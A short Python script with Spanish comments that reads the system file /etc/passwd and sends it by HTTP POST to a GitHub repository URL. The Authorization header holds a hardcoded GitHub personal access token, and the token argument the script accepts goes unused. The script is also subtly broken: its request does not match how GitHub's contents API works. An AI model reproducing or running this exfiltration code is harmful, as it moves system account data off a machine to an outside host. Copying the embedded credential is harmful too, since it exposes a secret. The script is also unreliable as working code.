import os
import requests

def get_passwd():
    """Obtiene el contenido del archivo passwd."""
    with open("/etc/passwd", "r") as f:
        return f.read()

def send_passwd(passwd, token, url):
    """Envía el contenido del archivo passwd a una ubicación remota usando un token de autenticación de GitHub."""
    headers = {
        "Authorization": f"token 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"
    }
    response = requests.post(url, headers=headers, data=passwd)

    if response.status_code == 200:
        print("El archivo passwd se cargó correctamente.")
    else:
        print("No se pudo cargar el archivo passwd.")

if __name__ == "__main__":
    passwd = get_passwd()
    token = "<token_de_autenticación_de_GitHub>"  # Reemplace con su token real
    url = "https://api.github.com/repos/yasjavi/archivos/contents/passwd.txt"  # Reemplace con la URL real
    send_passwd(passwd, token, url)
